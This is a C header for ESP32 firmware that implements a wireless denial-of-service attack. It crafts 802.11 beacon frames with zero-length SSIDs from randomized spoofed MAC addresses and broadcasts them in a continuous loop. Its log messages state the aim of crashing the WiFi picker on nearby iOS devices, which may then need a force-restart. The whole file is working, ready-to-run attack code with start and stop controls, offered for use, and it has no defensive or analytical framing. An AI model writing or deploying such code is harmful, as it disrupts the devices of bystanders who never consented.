// null_ssid_spam.h - Null SSID Spam Attack (Crashes iOS WiFi Picker)
#ifndef NULL_SSID_SPAM_H
#define NULL_SSID_SPAM_H

#include <stdint.h>
#include <string.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#define NULL_SSID_COUNT 30  // Number of null SSIDs to spam

static const char *NULL_SSID_TAG = "Null_SSID";

typedef struct {
    uint8_t running;
    uint32_t packets_sent;
    uint8_t channel;
    TaskHandle_t task_handle;
} NullSSIDSpam;

static NullSSIDSpam null_ssid_spam = {0};

// Beacon frame structure
typedef struct __attribute__((packed)) {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t dest[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint8_t seq_ctrl[2];
    
    // Fixed parameters
    uint8_t timestamp[8];
    uint8_t beacon_interval[2];
    uint8_t capability[2];
    
    // SSID parameter (tagged - NULL SSID)
    uint8_t ssid_tag;
    uint8_t ssid_len;
    // No SSID data - this is the NULL part
    
    // Supported rates
    uint8_t rates_tag;
    uint8_t rates_len;
    uint8_t rates[8];
    
    // DS parameter
    uint8_t ds_tag;
    uint8_t ds_len;
    uint8_t ds_channel;
} null_beacon_frame_t;

// Generate random MAC address
static void random_mac(uint8_t *mac) {
    uint32_t r = esp_random();
    mac[0] = 0x02; // Locally administered
    mac[1] = (r >> 0) & 0xFF;
    mac[2] = (r >> 8) & 0xFF;
    mac[3] = (r >> 16) & 0xFF;
    mac[4] = (r >> 24) & 0xFF;
    r = esp_random();
    mac[5] = r & 0xFF;
}

// Send null SSID beacon
static void send_null_beacon(uint8_t channel) {
    null_beacon_frame_t beacon = {0};
    
    // Frame control: Beacon
    beacon.frame_ctrl[0] = 0x80;
    beacon.frame_ctrl[1] = 0x00;
    
    // Destination: broadcast
    memset(beacon.dest, 0xFF, 6);
    
    // Random source MAC and BSSID
    uint8_t mac[6];
    random_mac(mac);
    memcpy(beacon.src, mac, 6);
    memcpy(beacon.bssid, mac, 6);
    
    // Sequence control
    static uint16_t seq = 0;
    beacon.seq_ctrl[0] = (seq & 0x0F) << 4;
    beacon.seq_ctrl[1] = (seq >> 4) & 0xFF;
    seq++;
    
    // Timestamp (will be filled by hardware)
    memset(beacon.timestamp, 0, 8);
    
    // Beacon interval: 100 TU (102.4ms)
    beacon.beacon_interval[0] = 0x64;
    beacon.beacon_interval[1] = 0x00;
    
    // Capability: ESS
    beacon.capability[0] = 0x01;
    beacon.capability[1] = 0x00;
    
    // SSID parameter - NULL (length 0)
    beacon.ssid_tag = 0x00;
    beacon.ssid_len = 0x00;  // THIS IS THE KEY - zero length SSID
    
    // Supported rates
    beacon.rates_tag = 0x01;
    beacon.rates_len = 0x08;
    beacon.rates[0] = 0x82; // 1 Mbps (basic)
    beacon.rates[1] = 0x84; // 2 Mbps (basic)
    beacon.rates[2] = 0x8B; // 5.5 Mbps (basic)
    beacon.rates[3] = 0x96; // 11 Mbps (basic)
    beacon.rates[4] = 0x0C; // 6 Mbps
    beacon.rates[5] = 0x12; // 9 Mbps
    beacon.rates[6] = 0x18; // 12 Mbps
    beacon.rates[7] = 0x24; // 18 Mbps
    
    // DS parameter
    beacon.ds_tag = 0x03;
    beacon.ds_len = 0x01;
    beacon.ds_channel = channel;
    
    // Send frame
    esp_wifi_80211_tx(WIFI_IF_AP, &beacon, sizeof(null_beacon_frame_t), false);
    null_ssid_spam.packets_sent++;
}

// Spam task - sends null beacons continuously
static void null_ssid_spam_task(void *param) {
    ESP_LOGI(NULL_SSID_TAG, "🔥 Null SSID spam task started");
    ESP_LOGI(NULL_SSID_TAG, "   Channel: %d", null_ssid_spam.channel);
    ESP_LOGI(NULL_SSID_TAG, "   Count: %d null SSIDs", NULL_SSID_COUNT);
    
    // Suppress WiFi warnings
    esp_log_level_set("wifi", ESP_LOG_ERROR);
    
    while (null_ssid_spam.running) {
        // Send NULL_SSID_COUNT beacons with different MACs
        for (uint8_t i = 0; i < NULL_SSID_COUNT; i++) {
            send_null_beacon(null_ssid_spam.channel);
            vTaskDelay(pdMS_TO_TICKS(5)); // 5ms between beacons
        }
        
        // Log stats every 10 seconds
        static uint32_t last_log = 0;
        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
        if (now - last_log > 10000) {
            ESP_LOGI(NULL_SSID_TAG, "📊 Beacons sent: %lu", null_ssid_spam.packets_sent);
            last_log = now;
        }
        
        vTaskDelay(pdMS_TO_TICKS(100)); // Repeat every 100ms
    }
    
    ESP_LOGI(NULL_SSID_TAG, "Null SSID spam stopped");
    null_ssid_spam.task_handle = NULL;
    vTaskDelete(NULL);
}

// Start null SSID spam
static inline uint8_t null_ssid_spam_start(uint8_t channel) {
    if (null_ssid_spam.running) {
        ESP_LOGW(NULL_SSID_TAG, "Already running");
        return 0;
    }
    
    ESP_LOGI(NULL_SSID_TAG, "💀 Starting Null SSID Spam Attack");
    ESP_LOGI(NULL_SSID_TAG, "   Target: iOS WiFi Settings");
    ESP_LOGI(NULL_SSID_TAG, "   Effect: Crashes WiFi picker");
    
    // Initialize WiFi for AP mode if needed
    esp_err_t err;
    err = esp_netif_init();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
    
    err = esp_event_loop_create_default();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
    
    // Create AP interface if not exists
    if (!esp_netif_get_handle_from_ifkey("WIFI_AP_DEF")) {
        esp_netif_create_default_wifi_ap();
    }
    
    // Initialize WiFi
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    err = esp_wifi_init(&wifi_cfg);
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
    
    // Set to AP mode
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    
    // Configure minimal AP (required for 802.11 TX)
    wifi_config_t ap_config = {0};
    strcpy((char *)ap_config.ap.ssid, "NULL_SPAM");
    ap_config.ap.ssid_len = 9;
    ap_config.ap.channel = channel;
    ap_config.ap.max_connection = 0;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    null_ssid_spam.channel = channel;
    null_ssid_spam.packets_sent = 0;
    null_ssid_spam.running = 1;
    
    // Start spam task
    xTaskCreate(null_ssid_spam_task, "null_ssid_spam", 4096, NULL, 5, 
               &null_ssid_spam.task_handle);
    
    ESP_LOGI(NULL_SSID_TAG, "✅ Null SSID Spam Active!");
    ESP_LOGI(NULL_SSID_TAG, "   iOS devices will freeze when viewing WiFi settings");
    ESP_LOGI(NULL_SSID_TAG, "   May require force-restart to recover");
    
    return 1;
}

// Stop null SSID spam
static inline void null_ssid_spam_stop(void) {
    if (!null_ssid_spam.running) return;
    
    ESP_LOGI(NULL_SSID_TAG, "Stopping Null SSID spam...");
    
    null_ssid_spam.running = 0;
    
    // Wait for task to finish
    uint8_t wait = 0;
    while (null_ssid_spam.task_handle && wait++ < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    // Stop WiFi
    esp_wifi_stop();
    
    ESP_LOGI(NULL_SSID_TAG, "Null SSID spam stopped");
    ESP_LOGI(NULL_SSID_TAG, "📊 Final Stats:");
    ESP_LOGI(NULL_SSID_TAG, "   Beacons sent: %lu", null_ssid_spam.packets_sent);
}

// Get stats
static inline uint8_t null_ssid_spam_is_running(void) {
    return null_ssid_spam.running;
}

static inline uint32_t null_ssid_spam_get_packet_count(void) {
    return null_ssid_spam.packets_sent;
}

#endif // NULL_SSID_SPAM_H
